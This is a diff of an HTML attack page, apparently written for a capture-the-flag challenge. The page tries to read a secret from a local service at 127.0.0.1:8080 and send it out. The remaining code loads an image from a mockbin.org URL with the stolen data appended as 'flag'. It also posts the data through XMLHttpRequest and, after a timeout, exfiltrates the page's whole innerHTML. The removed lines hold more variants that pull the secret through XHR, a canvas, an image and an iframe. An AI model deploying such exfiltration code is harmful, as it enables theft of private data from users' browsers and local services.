@@ -7,24 +7,6 @@
   <body>
   <img id="secret" src="http://localhost:8080/secret" onload="console.log('loaded')" onerror="console.log('error')">
     <script>
-	
-function getBase64Image(img) {
-    var canvas = document.createElement("canvas");
-    canvas.width = img.width;
-    canvas.height = img.height;
-
-    // Copy the image contents to the canvas
-    var ctx = canvas.getContext("2d");
-    ctx.drawImage(img, 0, 0);
-
-    // Get the data-URL formatted image
-    // Firefox supports PNG and JPEG. You could check img.src to
-    // guess the original format, but be aware the using "image/jpg"
-    // will re-encode the image.
-    var dataURL = canvas.toDataURL("image/png");
-
-    return dataURL.replace(/^data:image\/(png|jpg);base64,/, "");
-}
 function sendrequ(payload){
   	var img = document.createElement('img');
 	img.src = "http://mockbin.org/bin/5827eabf-b706-47be-adb7-498676d06877?flag=" + payload;
@@ -36,8 +18,6 @@ var req = new XMLHttpRequest();
     req.send("flag="+ payload);
 }
 setTimeout(function(){
-//console.log(getBase64Image(document.getElementById("secret")));
-//sendrequ(getBase64Image(document.getElementById("secret")));
 s2(document.documentElement.innerHTML);
 },5000);
 /*
@@ -54,42 +34,11 @@ function getFrameContents(){
    }
     return iFrameBody.innerHTML;
  }
-    
-    	var xmlHttp = new XMLHttpRequest();
-	if (xmlHttp) {
-		console.log("starting http requ");
-	    xmlHttp.open('GET', 'http://127.0.0.1:8080/secret', true);
-	    xmlHttp.onreadystatechange = function () {
-	    	console.log("readystate change: "+ xhttp.readyState);
-		  if (xhttp.readyState == 4 ) { //&& xhttp.status == 200
-		  	var img = document.createElement('img');
-			img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + xhttp.responseText;
-			document.body.appendChild(img);
-		  }
-	    };
-	    xmlHttp.send(null);
-	}
+
 	*/
-	//setTimeout(function(){sendrequ(getBase64Image(document.getElementById("ttt")));}, 5000);
-	//setTimeout(function(){sendrequ(getFrameContents());}, 5000);
-/*	
-    var i = new Image();
-    i.crossOrigin = "Anonymous";
-	i.src = "http://127.0.0.1:8080/secret.html";
-	i.onload = function(){
-		console.log("loaded img");
-		sendrequ(getBase64Image(i));
-	};
-	i.onerror = function(){
-		console.log("error img");
-		sendrequ(getBase64Image(i));
-	};
-	document.body.appendChild(i);
-	*/
+
     </script>
     
-    <!--<img id="ttt" src="http://127.0.0.1:8080/secret.html" style="width:1px;height:1px;" onload="sendrequ(getBase64Image(document.getElementById("ttt")))">-->
-    <!--<iframe id="testf" src="http://127.0.0.1:8080/secret.html" onload="sendrequ(getFrameContents())"></iframe>-->
   </body>
 </html> 
  
